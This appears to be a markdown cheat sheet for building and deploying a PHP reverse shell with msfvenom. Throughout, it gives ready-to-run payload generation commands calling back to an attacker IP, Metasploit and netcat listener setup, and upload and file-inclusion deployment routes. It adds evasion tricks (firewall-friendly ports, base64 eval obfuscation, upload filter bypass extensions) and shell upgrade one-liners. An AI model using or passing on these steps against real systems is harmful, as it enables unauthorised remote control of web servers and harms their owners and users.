# PHP Reverse Shell with msfvenom (Windows Target)

Generate a PHP reverse shell payload using msfvenom.

---

## Payload Generation

    msfvenom -p php/reverse_php LHOST=192.168.1.7 LPORT=443 -f raw -o shell.php

---

## Parameters Explained

| Option                  | Description                     |
|------------------------|---------------------------------|
| -p php/reverse_php     | PHP reverse shell payload       |
| LHOST=192.168.1.7      | Attacker machine IP address     |
| LPORT=443              | Listening port                  |
| -f raw                 | Output format as raw PHP code   |
| -o shell.php           | Output file name                |

---

## Listener Setup

### Using Metasploit Handler

    msfconsole
    use exploit/multi/handler
    set PAYLOAD php/reverse_php
    set LHOST 192.168.1.7
    set LPORT 443
    run

### Using Netcat

    nc -nlvp 443

---

## Deploying the Payload

Upload or place shell.php on the target system using one of the following methods:

- File upload functionality  
- Exploiting file inclusion vulnerabilities (LFI/RFI)  
- CMS or plugin exploitation  

Trigger the payload by accessing it via a browser:

    http://target-victim.com/shell.php

---

## Alternative Payload (Meterpreter)

For advanced interaction, generate a Meterpreter payload:

    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=443 -f raw -o meterpreter.php

Set the handler accordingly:

    set PAYLOAD php/meterpreter/reverse_tcp

## Practical Tips

### Use Common Ports

Common outbound ports that may bypass firewall restrictions:

- 443 (HTTPS)  
- 80 (HTTP)  
- 53 (DNS)  

---

### Basic Obfuscation

    msfvenom -p php/reverse_php LHOST=192.168.1.7 LPORT=443 -e php/base64 -f raw

Or manually encode:

    <?php eval(base64_decode("...")); ?>

---

### Bypass File Upload Filters

Try alternative extensions:

- shell.php.jpg  
- shell.phtml  
- shell.php5  

---

## Upgrade Shell

After gaining access, upgrade to a more stable shell:

    python -c 'import pty; pty.spawn("/bin/bash")'

Or:

    script /dev/null -c bash

---

## Verify PHP Execution

Test if PHP is enabled on the target:

    <?php phpinfo(); ?>

---

## Common Issues

| Problem               | Cause                              |
|----------------------|------------------------------------|
| No reverse connection | Incorrect LHOST or network issue   |
| Payload not executed  | PHP disabled or misconfigured      |
| Upload blocked        | File type restrictions             |
| Connection dropped    | Firewall or IDS/IPS filtering      |

---

## Quick Workflow

1. Generate payload  
2. Start listener  
3. Upload payload  
4. Trigger via browser  
5. Upgrade shell
